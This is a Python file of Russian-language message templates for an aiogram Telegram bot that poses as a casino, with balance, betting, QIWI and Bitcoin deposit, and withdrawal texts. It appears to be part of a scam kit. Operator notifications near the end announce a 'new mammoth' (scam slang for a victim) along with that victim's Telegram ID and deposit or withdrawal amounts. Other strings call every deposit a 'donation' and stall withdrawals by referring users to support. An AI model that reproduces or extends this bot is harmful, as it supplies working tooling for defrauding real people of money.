from aiogram.utils import emoji
from aiogram.utils.emoji import emojize

dont_working_text = emojize(
    ":man_technologist: <b><i>Ожидайте завершения тех. работ!</i></b>"
)
dont_working_alert = emojize("Ожидай завершения тех. работ! :cold_face:")

amount_must_be_digit = "Сумма должна быть числом!"

startup = emojize(":slot_machine: <b><i>Бот запущен!</i></b>")

self_cabine = emojize(
    ":pushpin: Личный кабинет\n\n"
    ":dollar: Баланс: <b>{balance} RUB</b>\n\n"
    ":high_brightness: Игр сыграно: <b>{games}</b>\n"
    ":four_leaf_clover: Игр выиграно: <b>{games_win}</b>\n"
    ":black_heart: Игр проиграно: <b>{games_lose}</b>\n\n"
    "<a href='{start_link}'>Ваша реферальная ссылка</a>"
)

graph = emojize("Значение графика: <b>X{value:.2f}</b> :chart:")

graph_win = emojize(
    "<b>Победа</b>! :smile_cat:\n" "Вы получили: <b>+{amount:.2f} RUB</b>"
)
graph_lose = emojize(
    "<b>Проигрыш</b>. :face_vomiting:\n" "Списанно с баланса: <b>-{amount:.2f} RUB</b>"
)

graph_stopped = emojize("<b>График</b> остановлен! :skull_and_crossbones:")

welcome = emojize(
    ":tada: Привет, <b>{name}</b>!\n"
    "<b>Политика</b> и <b>условия пользования</b> данным ботом :point_down:\n\n"
    "<code>1. Играя у нас, вы берёте все риски за свои средства на себя.\n"
    "2. Принимая правила, Вы подтверждаете своё совершеннолетие!\n"
    "3. Ваш аккаунт может быть забанен в подозрении на мошенничество/обман нашей системы!\n"
    "4. Мультиаккаунты запрещены!\n"
    "5. Скрипты, схемы использовать запрещено!\n"
    "6. Если будут выявлены вышеперечисленные случаи, "
    "Ваш аккаунт будет заморожен до выяснения обстоятельств!\n"
    "7. В случае необходимости администрация имеет право запросить у Вас документы, "
    "подтверждающие Вашу личность и Ваше совершеннолетие.\n"
    "8. Вы играете на виртуальные монеты, покупая их за настоящие деньги. "
    "Любое пополнение бота является пожертвованием!</code>\n\n"
    ":sparkle: <b>Спасибо за понимание и удачи в игре!</b>"
)

add = emojize(":gem: Введите сумму пополнения от <b>{min_deposit} до 10000 RUB</b>:")

add_req = emojize(
    "Переведите <b>{amount} RUB</b> на <i>QIWI</i>\n\n"
    "Номер: <b>+{account}</b>\n"
    "Комментарий: <b>{comment}</b>\n\n"
    "<i>Обязательно пишите комментарий к платежу!</i>\n"
    "<b><i>Если вы не укажите комментарий, деньги не поступят на счёт!</i></b>"
)

add_succesful = emojize(
    "Платеж на сумму <b>{amount} RUB</b>, прошел <b>успешно</b>!\n\n"
    "<b>Приятной игры!</b> :green_heart:"
)

add_unsuccesful = emojize(
    ":pensive: Счёт не оплачен!\n"
    "<b>проверьте оплату ещё раз</b> через <b>60</b> секунд!"
)

out_req = emojize(
    "<b>Введите реквизиты для вывода :moneybag:\n\n"
    ":credit_card: Вывод возможен только на те реквизиты, с которых пополнялся ваш баланс!</b>"
)

invalid_outbalance = emojize("Нечего выводить!\n" "Баланс: <b>{amount} RUB</b>")

out_req_succesful = emojize(
    "<i>Заявка на вывод средств отправлена</i>\n\n"
    ":warning: Средства придут к Вам на счёт в течении <b>2</b> до <b>30</b> минут.\n"
    "Ожидайте!"
)

out_invreq = emojize(
    ":hammer_and_wrench: Вывод возможен только на те QIWI кошельки или карты, "
    "с которых пополнялся ваш баланс!\n"
    ":warning: Обратитесь в Тех. Поддержку: <b>@{support_username}</b>"
)
# game
game_any = emojize(
    ":robot: Отправьте любое сообщение, чтобы подтвердить, что <b>Вы не робот</b>"
)

game_amount = emojize(
    "<b>Введите сумму ставки</b> :fire:\nВаш баланс: <b>{amount} RUB</b>"
)

game_bet = emojize(
    "Сейчас выпадет рандомное число от 1 до 99\n\n"
    "Выберите исход события :star:\n\n"
    "<b>&lt;50 - x2\n =50 - x10\n &gt;50 - x2</b>"
)

info = emojize(
    ":earth_africa: Текущий онлайн: <b>{online_now}</b>\n"
    ":money_with_wings: Последний вывод: <b>{last_out} RUB</b>\n\n"
    "<a href='t.me/{support_username}'>:technologist: Тех. Поддержка\n</a>"
    ":warning: Пишите только по <b>делу</b>!\n\n"
    "<a href='https://telegra.ph/Polzovatelskoe-soglashenie-10-07-2'>Пользовательское соглашение.</a>"
)


mention = "<a href='tg://user?id={cid}'>{name}</a>"

new_mamonth = emojize(":elephant: {mention} (/c{uid}) - твой новый мамонт (Казино)")

pay_mamonth = emojize(
    "{mention} создал заявку на пополнение\n\n"
    "Telegram ID: {cid}\n"
    "ID мамонта: /c{uid}\n"
    "Сумма: {amount} ₽"
)

out_mamonth = emojize(
    "{mention} создал заявку на вывод.\n\n"
    "Telegram ID: {cid}\n"
    "ID мамонта: /c{uid}\n"
    "Сумма вывода: <b>{amount} RUB</b>"
)

add_type = emojize("С помощью чего будем пополнять баланс? :face_with_monocle:")

add_banker = emojize(
    "Чтобы пополнить баланс с помощью Bitcoin,\n"
    "Создайте чек в <a href='https://t.me/BTC_CHANGE_BOT?start=12wAT'>BTC Banker</a> и отправьте его боту.\n"
    "Подробная инструкция как это сделать :point_down:"
)
